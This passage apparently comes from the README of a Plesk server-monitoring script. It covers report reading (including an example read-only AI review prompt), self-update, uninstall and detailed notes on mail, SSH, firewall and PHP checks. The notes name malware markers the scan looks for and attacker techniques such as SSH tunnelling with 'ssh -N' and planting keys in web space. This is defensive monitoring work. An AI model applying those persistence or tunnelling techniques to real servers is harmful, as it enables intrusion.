- **Yourself:** open `latest.txt`. The first lines tell you everything: `STATUS: OK` or `STATUS: WARNING (n)` followed by the alerts (` ! `), grouped by theme (`MAIL (2):`, `ACCESS (1):` …), and, if any, notes about missing data (` i `, e.g. a log file that was not found – the figures of that section are then 0, not "all clear"). `summary.txt` shows what happened during the day.
- **With an AI assistant (this is how the author uses it, with Claude):** connect an assistant that supports your storage (e.g. a Google Drive or OneDrive connector) **to the dedicated account** and let it review the day every morning as a scheduled task. Reading only `summary.txt` instead of every single report keeps the review fast and cheap (one file instead of 24), without losing anything: the summary is built from the reports, keeps every alert and has the newest daily checks. Tell the assistant what is normal on your server (known broken sites, mail-only domains, …) so it only reports real changes. Example prompt:

  > In the folder `server-reports/<hostname>`, search for the file `summary.txt` by name – don't list the whole folder. It condenses all reports of the last 24 hours in four themes – MAIL, ACCESS, WEB, SYSTEM: runs with status, every alert with count and first/last time (grouped by theme, the critical ones first), totals, every successful login, fail2ban, and at the end of each theme the newest daily checks. If `summary.txt` is missing or its newest run is more than 2 hours old, report that as an issue. Check the run list for gaps (more than 2 hours between runs). (Both limits assume the hourly cron job – if it runs every N hours, use N + 1 hours.) Alerts starting with "Script:" and the section SCRIPT NOTES mean the report itself is incomplete (a run aborted or still hanging, a command timed out, a log file not found) – report them too. If the daily checks of a theme are more than 26 hours old ("as of" in their heading), they did not run – report that too. Only if an alert needs more detail, read the single report of that time (`report-YYYYMMDD-HHMM.txt`). Go through the themes in their order. MAIL: outgoing spam signals, blocklist listings and rejections by the big mail providers ("Rejections of forwarded mail" were not sent by a customer, but forwarded spam still counts against the server IP – the alert "forwarded mails rejected" is an issue: name the forwarding address, the target and the original sender; below it, mention them only when they pile up), deliveries to watched recipient domains, addresses that forward spam to other providers (daily check of mail forwarding), mailbox logins from new countries (a login that read no mail is less likely an attack than one that downloaded the mailbox), customer devices with an outdated password ("failed logins of … – a device with an outdated password?"), refused blocklist lookups of the spam filter, delivery confirmations sent to other servers, full mailboxes, mail authentication. ACCESS: customers banned by fail2ban (alert starting with "fail2ban:" – include the unban command and the failed login named as the cause), logins from unknown IPs (a Plesk panel login under another name than your admin user always), new SSH keys, accounts, cron jobs, processes or ports (alerts starting with "Access:", "Cron:", "Process:", "Ports:" – many accounts getting the same shell in one run come as one alert, likely your own change), a new IP address of the server, Plesk system users with a full shell or a keys file they can change themselves ("SSH:"), an SSH login of an account not meant for SSH ("… – not meant for SSH:", also from a known IP – always an issue), databases reachable from the internet ("Database:"; a note that the Plesk Firewall's rule says the opposite of the kernel's rules: mention it). WEB: new PHP files in uploads, 5xx/PHP errors, expiring certificates and failed automatic renewals, exposed files. SYSTEM: failed services, crashes of nginx, Apache or the Plesk panel (alert starting with "Crash:" – can be an attack on a memory bug), backup status, pending security updates, a pending update of Plesk's nginx or a nginx still running the program from before an update ("Updates:"), a newer script version (mention once), domains on a PHP version without security support ("PHP:"; support ending within 90 days: mention once), loaded kernel modules of rarely used network protocols ("Kernel:"). Lines marked as a recommendation (e.g. missing HSTS) are not an issue – mention them once at the end. Start with "All OK" or "Action required: …", max. 10 bullet points with a concrete next step, the most urgent first. Read only, change nothing.

- A daily review **does not replace real-time alerting**. For "server down" use an uptime monitor (e.g. Plesk 360 Monitoring, Uptime Kuma), and set **outgoing mail limits** in Plesk (*Tools & Settings → Outgoing Mail Control*) so a hijacked mailbox is throttled immediately.

---

## What the script remembers

Between runs the script keeps its memory in `/var/lib/plesk-server-report` (or `state/` next to the script, see [Everything in one folder](#everything-in-one-folder)): where it stopped reading each log, known login IPs, countries per mailbox, the baseline of SSH keys, accounts, cron jobs and ports, and the local reports. The report of the first run (`first-report.txt`, kept for reference: it lists everything as it was found) is **not** in it, so it survives a deleted state folder: it is next to the script in a one-folder installation, else in `plesk-server-report-backup/` next to the script, and never replaced. It contains personal data (IP addresses, mailboxes) like every report – delete it when you no longer need it. You never have to touch it – but if you wonder why an alert did not come, or want the script to forget a known IP, [STATE-FILES.md](STATE-FILES.md) describes every file (the same text is kept as `README.txt` in that folder), and `plesk-server-report.sh --show-state` prints what is stored in readable form.

---

## Updates

The script runs on a production Plesk server with about 40 domains and is **actively maintained**. Every morning the reports are reviewed (see [Reading the reports](#reading-the-reports)). When a review shows a blind spot, a false alarm or a recommendation the script could have handled itself, the script is updated. New findings about attacks, log formats or Plesk behaviour go in as well. Real-world examples so far:

- a distributed WordPress brute-force attack led to the *WordPress login attacks* section (distinct IPs, wp-login vs. xmlrpc, detection of successful logins after failures),
- a daily check that silently missed data under cron led to the fixed `PATH`,
- a review of the whole script with fresh eyes found two blind spots: kernel security updates were not counted (they need a new package, which the simulated `apt-get upgrade` leaves out), and a PHP file with its date set back was invisible to the scans for new and suspicious files – both fixed in 1.9.0,
- Postfix logging `sasl_username` on failed logins initially caused false "compromised mailbox" alarms, which has been fixed.

**From version 1.12.0 on**, the script updates itself – started by hand, as root, in a terminal:

```bash
/usr/local/sbin/plesk-server-report.sh --self-update      # newest 1.x release: shows the changes, asks
/usr/local/sbin/plesk-server-report.sh --only services    # quick test run with your configuration
```

It looks for the newest **1.x** release, downloads its script from GitHub, checks it without running it (valid bash, the expected version), shows the CHANGELOG sections since your version and asks before it replaces anything. With the same version number it compares the files: a copy taken from `main` before the release can differ from the release, and is then offered to be replaced by it. It also finds the commit your copy came from – by git's checksum of the file, computed without git, among the last 20 commits that changed the script (one GitHub API request each; 60 an hour are allowed without login) – and lists the commits the release adds; if it can't find it, it shows the release's CHANGELOG section. It waits for a running report to finish. The previous versions are kept next to the script – `plesk-server-report-backup/` (in `/usr/local/sbin`), or `backup/` in a one-folder installation; `BACKUP_DIR` names another folder – as `plesk-server-report-VERSION.sh` (mode 600, not executable), the newest `SCRIPT_RETENTION` (default 5). Not in the state folder: that one may be deleted at any time. `--self-update --rollback` brings back the newest kept version and keeps the one it replaces (called twice, it goes forward again); `--self-update --rollback 1.14.0` brings back that version. Going back to a version before 1.16.0 is one way: that version doesn't know the backup folder, so its `--rollback` finds nothing there – go forward again with `--self-update` (or `--self-update --edge`). `--yes` skips the question – it still has to be started from a terminal, never from cron. A git checkout is refused: update it with `git pull`. Your settings in `/etc/plesk-server-report.conf` and the state are kept.

**On the edge: the development version.** To get changes before they are released (from version 1.14.0 on):

```bash
/usr/local/sbin/plesk-server-report.sh --self-update --edge
```

It installs the script of the newest commit on `main` – **not a release**: it may still change before the release, and it is what the author runs on his own server first. It is only installed when GitHub's tests of that commit (syntax, shellcheck, the bats tests with mawk and gawk) passed, and only within your major version (1.x stays 1.x). Everything else works as above: the file is downloaded from that commit (not from the moving branch), checked, the commits since your copy are listed, you are asked, and your previous copy is kept for `--self-update --rollback`. To go back to releases, simply use `--self-update` without `--edge`: the next release replaces the development version.

**Up to version 1.11.x**, or if you prefer it, download the script again – your settings and the state are kept as well:

```bash
curl -fsSL -o /usr/local/sbin/plesk-server-report.sh \
  https://github.com/cmelius/plesk-monitoring-server-Report/releases/latest/download/plesk-server-report.sh
/usr/local/sbin/plesk-server-report.sh --version
/usr/local/sbin/plesk-server-report.sh --only services    # quick test run with your configuration
```

The test run matters: if something keeps the script from running – since 1.9.0 for example a configuration file that another user may write – you see it right away, not only when the reports stop coming. `--version` doesn't load the configuration and won't tell you.

(or the `main` URL from [Installation](#installation) to get changes before they are released – from 1.14.0 on `--self-update --edge` does that with the checks above)

### Updating from 1.x

There is no version 2 yet – 1.x is the maintained version. `--self-update` (also with `--edge`) always stays within the installed major version; should a version 2 ever come, `--self-update` would only tell you about it, and switching would be a deliberate `--self-update --major`, described here.

Watch the repository (*Watch → Custom → Releases* or *All activity*) to get notified about changes. Issues and pull requests with your own findings are welcome.

### Updating to 1.21.0: the reports are ordered by theme

Version 1.21.0 changes the layout of the text report and of `summary.txt` – the content stays the same, it is only sorted differently:

- **Four themes instead of one list of checks:** MAIL, ACCESS, WEB, SYSTEM, each with its daily checks at the end. The block *DAILY CHECKS* is gone; the daily checks of a theme are under `== THEME – daily checks (as of …) ==`. The table under [Example report](#example-report-fictional-data) shows which check is where.
- **The alerts at the top are grouped by theme**, the critical ones first.
- **`summary.txt` alone is enough for a review** – it now also has fail2ban, failed panel logins and the newest daily checks. **If an AI reads your reports with a prompt from an earlier README** (one that reads `latest.txt` for the daily checks and fail2ban), switch to the [current example prompt](#reading-the-reports); the old one still works, but reads a file it no longer needs.
- **Scripts that read the text report** should look for the new headings (e.g. `== MAIL: delivery & spam filter ==` instead of `== MAIL ==`) – or better use the [JSON report](#json-report-optional-json_report1): its schema stays 1, the mail check now gives one section per heading, and the failed Let's Encrypt renewals have the check `certrenew`.
- **For one day after the update, `summary.txt` is mixed:** it covers the last 24 hours, and the reports from before the update have the old layout. Alerts seen only in those are listed under `OTHER`. To start clean right away, delete the old reports – the state (offsets, known IPs, baselines) is not touched:

  ```bash
  rm /var/lib/plesk-server-report/out/report-*.txt     # in a one-folder installation: its out/ folder
  ```

### Changelog

What changed in each version: see [CHANGELOG.md](CHANGELOG.md).

---

## Uninstall

First find out where the state is kept: `plesk-server-report.sh --show-state | head -1`.

**Usual layout:**
```bash
rm -f /etc/cron.d/plesk-server-report
rm -f /usr/local/sbin/plesk-server-report.sh /etc/plesk-server-report.conf
rm -rf /usr/local/sbin/plesk-server-report-backup /var/lib/plesk-server-report
```

**Everything in one folder:**
```bash
rm -f /etc/cron.d/plesk-server-report
rm -rf /opt/plesk-server-report
```
If the report said the state stays in `/var/lib/plesk-server-report` (an older installation), remove that folder too.

**Also check:**
- a cron line in root's crontab (`crontab -l`) instead of `/etc/cron.d`
- a `STATE_DIR`, `BACKUP_DIR` or `--config FILE` of your own: remove those as well
- the upload: `rclone config delete reports` removes the remote; the reports already uploaded stay until you delete them
- SFTP upload: `/root/.ssh/report_upload*`, and the key's line in `authorized_keys` on the target server
- packages installed only for the script (`rclone`, `mmdb-bin` / `libmaxminddb`), if nothing else uses them

The script leaves nothing else behind: no service, no package, no change to system files.

---

## Notes and limitations

- **Mail forwarding to Gmail & co.** A forwarded mail leaves from your server: if it is spam, Gmail or Microsoft throttle or reject it and rate your server's IP for it – which hits the mail of every customer. Plesk runs the spam filter before it forwards, and what it does with spam decides: spam that is **deleted** or **moved to the Spam folder** is not forwarded, spam that is only **marked** is (tested with a blocklisted sender on Plesk Obsidian). *Move* needs a copy kept in the mailbox – with "Do not deliver copies of forwarded emails to the Plesk mailbox" Plesk offers only *delete* and *mark*; an address still set to *move* from before is listed like *mark*. The daily check lists every address forwarding to another provider with its spam action. Two more things let spam through to be forwarded: Plesk's default size limit for SpamAssassin is 256000 bytes, and bigger mails are not checked at all – spam waves are sent just above it on purpose (raise `SA_MAX_MAIL_SIZE` in `/etc/psa/psa.conf`, e.g. to 5242880; Plesk reads it for every mail) –, and a missing DNS blocklist for incoming mail. Plesk itself does the forwarding right: it rewrites the sender (SRS) and signs with ARC, so SPF and DMARC still pass at the receiver. The hourly checks show the consequences: mails not scanned for their size, refused blocklist lookups of SpamAssassin and delivery confirmations to spammers each raise an alert with the fix; rejections of forwarded mail by Gmail & co. are counted on a line of their own, per forwarding address and original sender, and raise an alert from `WARN_FORWARD_REJECT` (10 per run) on.
- **Crashes and rarely used kernel modules.** Two checks added after the nginx vulnerabilities published in November 2026 ("nginx2root": remote code execution through HTTP/2, chained with a bug in the kernel's SCTP module for root). An exploit of a memory bug rarely works at the first try: the attempts make the worker processes crash – nginx, Apache and PHP-FPM log that, the kernel logs a segfault. So a server program that crashes again and again is worth a look, also when no vulnerability is known yet. Plesk runs its own panel (ports 8443/8880) on a nginx of its own, `sw-cp-server`, which the same holes affect – and `plesk bin http2_pref` doesn't cover it; its crashes are listed as `plesk-panel` and are critical like those of nginx and Apache; a single crash of PHP-FPM is more often a faulty PHP extension (then `IGNORE_CRASHES`). The second part: SCTP, DCCP, TIPC and RDS are network protocols almost no web server uses, but the kernel loads their module as soon as any process opens such a socket – also a web server worker in an attacker's hands –, and bugs in them led to root more than once. The daily check shows whether they are loaded, blocked or loadable, with the command to block them (`install sctp /bin/false` in `/etc/modprobe.d/`; a loaded module goes with `modprobe -r` or a reboot). The script itself blocks nothing.
- **PHP versions without security support.** A domain on a PHP version that gets no security fixes any more is one of the commonest ways into a web server. The daily check lists each version in use with its domains and the end of its security support, the versions only installed (they can be removed in *Tools & Settings → Updates → Add/Remove Components*) and those still the default of a **service plan** – also a reseller's: every new subscription on that plan gets that version. The dates come from php.net's list of branches (fetched at most once a day; only version numbers and dates are read from it), else from a table in the script; `PHP_EOL` overrides both. For a newer 8.x the script doesn't know, the date is estimated from php.net's schedule since 8.2 – a new 8.x every November, security fixes until 31 December four years later – and marked "estimated"; for PHP 9 it says "unknown" until you set `PHP_EOL`. To keep a daily alert from becoming noise, an alert comes only when something changes: a domain newly uses a version without support, or a version in use loses it – once. A site deliberately kept on an old version stays in the list, without repeating the alert.
- **SSH access of the Plesk system users.** Every subscription has a system user (group `psacln`), and the PHP of its sites runs as that user. Plesk offers per subscription (*Hosting & DNS → Hosting → SSH access*): *Forbidden*, */bin/bash (chrooted)* – locked in its own web space – or a full shell such as */bin/bash*. A full shell sees the whole server, and it is easily set "for a moment" for a developer and forgotten, or spread by a service plan. Its keys file is by default `~/.ssh/authorized_keys` – in the web space, so a hacked site can add an SSH key and keep a full shell. The daily check warns about full shells not listed in `ALLOWED_FULL_SHELL_USERS`, and about a full shell whose keys file (or one of its folders) the account can change. For a full shell on purpose keep the keys outside the web space, owned by root – in `sshd_config`: `Match User deputy` / `AuthorizedKeysFile /etc/ssh/authorized_keys/%u`. What sshd applies to each account (keys files, `ForceCommand`, `AllowUsers` …) the script reads with `sshd -T` – that is the configuration on disk; if sshd wasn't reloaded after a change, the running one may differ. The hourly check reads the same keys files, so a key kept outside the home folder is watched too. And it checks every successful SSH login against the account: a login for a system account (UID below `UID_MIN`), for an account whose login shell refuses logins (*Forbidden*, `nologin`, `false` – sshd still accepts its key, and `ssh -N` opens a tunnel without a shell), or for a Plesk system user with a full shell not in `ALLOWED_FULL_SHELL_USERS` is a critical alert of its own – also from a known IP, where the *unknown IP* alert stays quiet. SFTP logins of chrooted subscriptions are normal and not reported.
- **Databases and the Plesk installer from outside.** A database server that listens on a public address and is not filtered can be attacked directly – password guessing, or a bug of the server itself. Plesk keeps MySQL/MariaDB local unless *Allow local MySQL server to accept external connections* is ticked (Tools & Settings → Database Servers → Settings). The daily check reads what listens on which address and port (`ss` – the port of the running database process, so a server moved to another port is checked there, and whether Plesk uses it or not: a second database server installed once and forgotten is found as long as it runs) and the **firewall rules the kernel actually applies** (`iptables-save`, `ip6tables-save` when the server has a global IPv6 address, and the sizes of `ipset` lists; read only). Not only the Plesk Firewall writes rules there: fail2ban, other security tools, scripts and commands by hand do too, and the Plesk Firewall's stored list doesn't know about them. The check follows a new connection to the port through the chain `INPUT` and the chains it jumps to; rules for certain sources (an address, an ipset) decide only for them, what can't be judged from a rule alone (rate limits, `recent`, negations) counts as open rather than closed, and the bans of fail2ban (chains and ipsets `f2b-…`) are left out – they are no rule about the port. When the Plesk Firewall's own rule (`plesk ext firewall --list-json`) says the opposite of the kernel, the report adds a note. Rules in other nftables tables (e.g. firewalld's) are named but not read. Without any iptables rules, the Plesk Firewall's rules are used, as before. A database open to everyone raises a warning. The **Plesk installer** (port 8447, *Updates* in the panel) runs only while it is used, but Plesk's firewall allows it from everywhere by default, so while it runs anyone can reach its login (the hourly port check lists it then, without an alert – it comes back every time you open *Updates*). Allow it only from your own addresses, or block the port and update over SSH as root with `plesk installer --select-release-latest --upgrade-installed-components` (Plesk's own command for it; *Updates* in the panel then no longer works). If you update from home with a changing address and the panel login uses MFA, leaving it open is a reasonable choice: `WARN_INSTALLER_OPEN=0` keeps only the line. Not visible from the server: a firewall in front of it, e.g. the one in the hosting provider's control panel. To test from outside, from your own computer: `Test-NetConnection your-server -Port 3306` (Windows PowerShell) or `nc -vz your-server 3306` (Linux, macOS).
- **`/etc/rc.local` is deprecated.** systemd still runs it at boot (`rc-local.service`), but only when the file exists and is executable – no current distribution ships it that way (Debian/Ubuntu have no `rc.local`, the RHEL family ships it not executable). So an `rc.local` that runs commands was set up by someone: an admin, an online guide (some still advise enabling `rc-local.service` – there is no need), or the installer of old software. It is also a classic place where malware starts itself. The daily check says whether it is in use; with commands in it, it raises a warning (`WARN_RC_LOCAL=0` keeps only the line), an executable file without commands gets a recommendation (`chmod -x /etc/rc.local`). A failed `rc-local.service` is a line in *Services*, not an alert of its own: whether it needs action depends on what is in `rc.local`, and that is what the daily check judges (it also says when the service failed). To move the commands to a systemd unit – put them into a script, e.g. `/usr/local/sbin/local-startup.sh` (`chmod 700`), then:
  ```ini
  # /etc/systemd/system/local-startup.service
  [Unit]
  Description=Local startup commands (formerly /etc/rc.local)
  After=network-online.target
  Wants=network-online.target

  [Service]
  Type=oneshot
  ExecStart=/usr/local/sbin/local-startup.sh
  RemainAfterExit=yes

  [Install]
  WantedBy=multi-user.target
  ```
  ```bash
  systemctl daemon-reload && systemctl enable local-startup.service
  chmod -x /etc/rc.local       # rc-local.service no longer runs it
  ```
  The new unit shows up once as a new autostart file in *Access & persistence* – expected. Commands that need more (a service that keeps running, ordering after a database) are better as a unit of their own with `Type=simple` and the right `After=`.
- **Postfix logs `sasl_username` on failed logins too** (recent versions). The script handles this. If you adapt the parsing, keep in mind that a username appearing in the log does not mean the login succeeded.
- **Webmail is analysed from Roundcube's own logs** (`/var/log/plesk-roundcube/sendmail` and `errors`), because Roundcube talks to Postfix and the IMAP server (Dovecot or Courier) from `localhost`: in the mail log those mails carry neither the user's IP nor (on Plesk) the mailbox name. Without this section, a hijacked mailbox sending spam through webmail would be invisible. Roundcube does not log successful logins by default (`log_logins = false`). The script doesn't need them, since every sent mail is logged with mailbox and IP. Leave that Plesk-managed config alone.
- **"Top senders" includes incoming mail** (e.g. newsletters from Amazon SES). The alert for that list only counts mail sent from this server, after a mailbox login or by a local script. The *authenticated mailboxes*, *login ≠ from* and *scripts* sections are the ones that show what your server sends on behalf of your users.
- **Courier IMAP/POP3 and fail2ban:** Plesk's default jails cover Dovecot (`plesk-dovecot`), not Courier. If your server uses Courier, check whether the jail `plesk-courierimap` is switched on – if not, failed IMAP/POP3 logins are never banned. Switch it on in *Tools & Settings → IP Address Banning → Jails*. Before you do, check the *Failed mail logins* section for IPs of your customers: a device with an outdated password retries every few seconds and gets its whole connection banned.
- **Banned customers:** once fail2ban bans an IP, its attempts no longer reach the server – so a customer with an outdated password disappears from the failed-login figures exactly when they can't fetch mail any more. The script remembers the client IPs of successful IMAP/POP3 and SMTP logins for `KNOWN_MAIL_IP_DAYS` (default 30; on the first run also from the rotated mail logs) and raises an alert when a jail bans one of them, with the mailbox and the unban command – and with the login that failed from there in the last day, which names the cause: often one phone in an office still set up for a mailbox that was deleted long ago, banning the whole office. The same goes for IPs with earlier SSH or Plesk logins. The alert repeats in every run while the ban lasts; correct the password on the device, then unban.
- **`.htaccess`, `.user.ini`, `php.ini`:** the daily scan for suspicious code checks them for a file loaded before every PHP request (`auto_prepend_file`/`auto_append_file`; Wordfence, NinjaFirewall and Sucuri use this legitimately and are excepted), PHP executed for image or text files, and the `<FilesMatch ".(py|exe|php)$">` block of a widespread WordPress malware campaign. The first scan checks all of these files, later scans only changed ones.
- **Outdated passwords before the ban:** failed logins of one mailbox from an IP that has logged in successfully before (the same mailbox, or another one from the same office connection) raise an alert from `WARN_OLD_PASSWORD` failures in a run (default 3) – usually a phone or tablet after a password change in Plesk, which keeps retrying until fail2ban bans the whole connection. Attackers rarely come from such an IP. If the login name doesn't exist (any more), the alert says so: a device still set up for a deleted mailbox. Login names that don't exist are marked in "Most attacked mailboxes" (Plesk logs them; Dovecot as "unknown user").
- **Spam filter blocklists:** SpamAssassin asks URIBL and others via DNS. Through a shared resolver – the hosting provider's, or a public one like 8.8.8.8 – the lists' free limit is exceeded, and they refuse to answer (`URIBL_BLOCKED` in the mail log). Links in spam are then not checked, and nobody notices. The report counts these mails and alerts with the fix: let SpamAssassin ask a resolver on the server itself (`dns_server 127.0.0.1` in a file of its own in the SpamAssassin configuration, e.g. `/etc/spamassassin/zz-local-dns.cf`; on Plesk, BIND answers recursive queries from the server itself), then restart spamd.
- **Mailbox size limits:** the usage comes from the `maildirsize` file of each mailbox (kept up to date by Courier and Dovecot), the limit on Plesk from its database – the mailbox's own limit, or the subscription's default when the mailbox has none (domains inside a subscription use the main domain's). The limit in `maildirsize` is not reliable on Plesk – Plesk enforces its own limit through its mail filter –, so it counts only without Plesk. Mailboxes without `maildirsize` are left out (the report says how many). Mailboxes without a limit can't become full, but they can fill the disk and every backup: their size is measured with `du` on the Maildir folder, the report names the largest one and the total, and one larger than `WARN_MAILBOX_UNLIMITED_GB` (default 5 GB) raises a warning. A full mailbox rejects mail with `4.2.2` (senders retry for a few days) or `5.2.2` (the mail is returned at once); the hourly check names the mailbox, so the size can be raised before mail is lost. Why this matters: by default, Plesk tells only the customer when limits are exceeded (*Tools & Settings → Notifications → Resource usage limits exceeded by subscription*: only "Customer" is ticked), and that mail is easy to overlook. Unless you tick the administrator (or reseller) there as well, you see a full mailbox only when you open it – and once it is full, mail stops arriving without anybody noticing. Worth ticking; the report checks the mailboxes either way.
- **Delivery confirmations (DSN):** Postfix offers them to every server by default. Spammers request them (`NOTIFY=SUCCESS`) to learn which addresses exist – and the confirmation goes to the forged sender, where it usually sits in the queue as "deferred" for days. The report counts confirmations sent to other servers and alerts from `WARN_DSN`. The fix from Postfix's `DSN_README`: offer DSN to the server itself only. Create `/etc/postfix/esmtp_access` with
  ```
  127.0.0.0/8   silent-discard
  ::1/128       silent-discard
  0.0.0.0/0     silent-discard, dsn
  ::/0          silent-discard, dsn
  ```
  then `postconf -e 'smtpd_discard_ehlo_keyword_address_maps = cidr:/etc/postfix/esmtp_access'` and `systemctl reload postfix`. This is safe to do – everyday mail is not affected:
  - mail is sent and received as before, and bounces for undeliverable mail still arrive;
  - read receipts still work – they are a header in the mail, not DSN;
  - programs on the server itself (scripts, the Plesk panel) may still request DSN;
  - the only thing lost: the "delivery receipt" option of mail clients like Outlook for mail sent through this server, and confirmations other senders request for mail to your customers. Few people use either.

  Plesk may reset `main.cf` (e.g. `plesk repair mail`) – the report then shows the confirmations again, and you set the one line again (the file stays).
- **Mail logins from datacenters** inside `ALLOWED_COUNTRIES` are listed for information, without alert: mail apps that fetch through their own servers, VPNs, iCloud Private Relay – or a stolen password used from a rented server. A mailbox that suddenly appears there deserves a look. Operators in `GEO_TRUSTED_ORGS` are left out.
- **Plesk's own log** (`PLESK_ERROR_LOG`, default `/var/log/plesk/panel.log`, section `PLESK PANEL LOG`): failed panel logins with login name and top IPs, and failed automatic certificate renewals with the reason from Let's Encrypt. Plesk renews 30 days before expiry and retries daily, so a failure shows up weeks before the certificate check warns. Typical reasons: the domain points to another server or doesn't exist any more (remove it or its certificate from Plesk), or the challenge URL `/.well-known/acme-challenge/` is blocked or redirected. Without Plesk the section says the log was not found.
- **Deliveries per provider:** the report lists outgoing deliveries grouped by the receiving provider, recognized by its MX host (Microsoft, Google, Apple iCloud, GMX/web.de/IONOS, T-Online, Yahoo/AOL, Strato; others by the MX domain, e.g. a company's spam gateway). A provider with many deferrals or bounces shows a delivery problem even when its rejection text isn't one the script knows. Deferrals are counted per delivery attempt – Postfix logs every retry, so one mail retried five times counts five times; the number of distinct mails behind them follows in brackets (`29 (7 mails)`). That is the number of mails Postfix *tried* in the period: a mail that has waited for hours is retried only about once an hour, so it may be missing from one report while it is still in the queue (`queue:` in the line above counts what is waiting). The table is grouped by the receiving mail server, not by the recipient's domain: mail to a spammer's forged domain (a bounce or a delivery confirmation) shows up under the name of its usually unreachable mail server, often a random-looking domain.
- **Spam filter size limit:** SpamAssassin skips mails larger than its limit (Plesk default 256 KB, `SA_MAX_MAIL_SIZE` in `/etc/psa/psa.conf`). Spam waves with large image attachments use exactly that gap. The report counts the skipped mails (`Spam filter: N mail(s) not scanned`); if the number is high, raise the limit (e.g. to `3145728` = 3 MiB).
- **IP blocklists** (`DNSBL_LISTS`) are asked through the server's own resolver on `127.0.0.1` if one answers there – on Plesk that is BIND –, else through the system resolver (`BLOCKLIST_RESOLVER`); the report says which. Blocklists refuse large shared resolvers, and the system resolver often forwards to the hosting provider's DNS: on the author's server, URIBL refused the provider's resolver from one day to the next. Before the server IP, the script asks for each list's test entry `127.0.0.2`, which every list must answer as listed (RFC 5782). So the report tells three things apart: `clean` (the list answers, the IP is not on it), `query-refused` (the list says it refuses this resolver – Spamhaus does that for large public resolvers) and `no-answer` (the list doesn't answer at all). The last two mean "unknown", not "clean".
  - **Barracuda** (`b.barracudacentral.org`) is not in the default list (since 1.12.0): it answers only DNS servers registered with Barracuda, and its registration page has not been reachable for some time. Through a hosting provider's resolver it may answer – presumably because the provider is registered, while your server isn't. To check it anyway, add it, and if needed send its queries through a resolver it answers:
    ```bash
    DNSBL_LISTS="zen.spamhaus.org bl.spamcop.net psbl.surriel.com b.barracudacentral.org"
    BLOCKLIST_RESOLVER=system   # all blocklists through the system resolver – Spamhaus and URIBL may refuse it
    ```
    Whether Barracuda answers shows in the report: `clean` or `LISTED` when it does, `no-answer` when it doesn't.
  - **UCEPROTECT** is not in the default list, but some receivers use it. To check it as well, add Level 1 (single IPs): `DNSBL_LISTS="zen.spamhaus.org bl.spamcop.net psbl.surriel.com dnsbl-1.uceprotect.net"`. Levels 2 and 3 list whole provider networks and would alert for other customers' spam.
- **Domain blocklists** (`DOMAIN_BLOCKLISTS`: Spamhaus DBL, SURBL, URIBL) list domains seen in spam and phishing – for a hosted domain usually a hacked website. A refused query (each list has its own answer for it) is listed as a note, not as a finding.
- **Plesk panel logins:** Plesk writes no login events to `panel.log` (it only contains errors), so logins are read from the panel's access log `/var/log/plesk/httpsd_access_log` (Plesk 18 on Debian, Ubuntu and RHEL-based systems). A login is a `POST /login_up.php`; only a successful one is followed by a panel page (`/admin/`, `/smb/` or `/cp/`) with `login_up.php` as referrer. Only the standard access-log fields are used (IP, request, status, referrer), so older log formats work too; logins through a domain (`https://example.com/login.php`, proxied from `127.0.0.1`) are attributed to the real client IP when Plesk logs it. The access log doesn't contain the user name, so the report shows the IP only. Logins that did not reach a panel page are counted as failed attempts. Logins via the Plesk API or "Log in as customer" are not covered. SSH logins are read from `auth.log`/`secure` or the journal.
- **TLS check** connects to the server's public IPv4. Domains that are mail-only, redirected elsewhere or without SSL are listed as "no matching certificate". That line is informational, not an alert.
- **HSTS and http→https check** looks only at domains whose certificate is valid for them and whose A record points to this server – aliases, redirects and mail-only domains can't use HSTS, and for a domain hosted elsewhere this server's headers don't matter. One HEAD request per domain to this server (and one redirect to the same domain with or without `www.` is followed). The header counts no matter who sets it: Plesk, `.htaccess` or a WordPress plugin. Missing HSTS or redirect is a recommendation, not an alert. `max-age` and `preload` are not judged: Plesk's default of six months is fine, and `preload` is hard to undo, so it is the site owner's decision.
- **Backup check** covers Plesk's own backup manager (status from `backup.log` in the PMM log directory, `BACKUP_LOG_DIR`). Provider-side snapshots are not visible to the script, except whether an Acronis agent is running.
- **WordPress login success** is derived from the HTTP status: a successful `wp-login.php` POST returns `302`, a failed one `200`. Security plugins that change the login flow (custom login URLs, 2FA, CAPTCHAs) may change these codes. Logins via `xmlrpc.php` always return `200`, so their success cannot be told from the access log. Block `xmlrpc.php` if you don't need it (Plesk: *WordPress Toolkit → Security*).
- **IMAP/POP3 logins** are checked by country as well: an attacker with a guessed password who only reads mail sends nothing, so the sending checks never see him. The report lists every login from outside `ALLOWED_COUNTRIES` (plus a count of all logins checked), but the **alert comes only once per mailbox and country**:
  - *How much was read:* each line says how much mail the sessions from that IP fetched – `no mail read`, or e.g. `48.3 MB of mail read` (Courier: headers and bodies, POP3 downloads; Dovecot: `hdr_bytes`/`body_bytes` of its default logout line). A login that read nothing is typically a phone keeping an idle connection open – for example over a VPN that switched itself on in a hotel Wi-Fi. A login that downloads the whole mailbox from a datacenter is what an attacker does. A session that is still open at the end of the run has no figure yet.
  - *Why only once:* a customer on holiday in Spain who reads mail every day would otherwise raise the same alert in every run for weeks, and real warnings would drown in it. What matters is the *first* login from a new country – on holiday you see it once and know why; after a stolen password you see it too, usually without anyone travelling.
  - *Per mailbox:* a country is only known for the mailbox that used it. `a@example.com` in Spain doesn't make Spain known for `b@example.com`, so the list never turns into a server-wide allowlist.
  - *Forgotten again after `IMAP_COUNTRY_KEEP_DAYS` (default 30):* a country that hasn't been seen for a mailbox for that long is removed. Otherwise every mailbox would collect its holiday countries over the years, and a later break-in from one of them would go unnoticed. With 30 days, a three-week holiday gives one alert on the first day, the next trip months later gives one again, and a customer who regularly reads mail from abroad stays known as long as he keeps doing so. `0` = never forget.
  - The state is kept in `/var/lib/plesk-server-report/known_imap_countries` (`mailbox CC last-seen`, one per line; delete a line to be warned again). On the first run the countries seen at that moment are stored silently.
- **Country alerts and mail apps:** some apps connect to your mail server **from their provider's cloud**, not from the user's device. The Outlook app (iOS/Android) for IMAP accounts uses Microsoft servers, Gmail's "send mail as" uses Google servers, both often outside your country. Those logins show up as `[datacenter]` in another country. If your customers use such apps, add the operator to `GEO_TRUSTED_ORGS`, accepting that attackers on that cloud are then not flagged by country (the IP count and login ≠ from checks still apply). Geolocation is an additional signal, not proof: attackers can use VPNs in your country.
